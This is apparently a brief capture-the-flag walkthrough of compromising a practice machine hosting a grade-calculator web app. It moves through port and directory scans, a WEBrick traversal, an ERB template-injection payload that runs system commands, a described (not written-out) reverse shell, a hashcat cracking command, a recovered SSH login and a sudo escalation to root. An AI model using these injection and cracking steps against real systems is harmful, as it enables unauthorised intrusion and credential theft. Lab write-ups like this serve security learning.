Started a nmap scan 
```
22 OpenSSH 8.9p1
80 nginx
3000     ####maybe
```
Starting with a gobuster scan list `2.3-medmium` 
```
/about
/weighted-grade-calc
```
When looking at if `WEBrick 1.7.0` had any vulns and found a directory traversal vuln it took me to a error page if you look at the source code there is a reference to a local host running on port `3000`
Looking for SSTI in the calculator page after testing for a while it keep says malicious input but found after testing all the fields its in category1 has a SSTI I got it to ping back 
	`a<%=system("ping+-c1+ip");%>` 
after a while I found how to get a rev shell I had to put it in a sh file and have the server exacute it and the rev shell stayed and we are now the user `susan` I found a password hash in the 
	`/home/susan/Migration/pupilpath_credentials.db` 
We got some hash from this database and using hashcat we can crack the password with this
	`hashcat -m 1400 hash -a 3 susan_nasus_?d?,,,,,,` 
Can you this to login into ssh
	`susan:sudan_nasus_413,,,,,0` 
Now were in as susan and running sudo -l we can do anything so `sudo su root` and now were root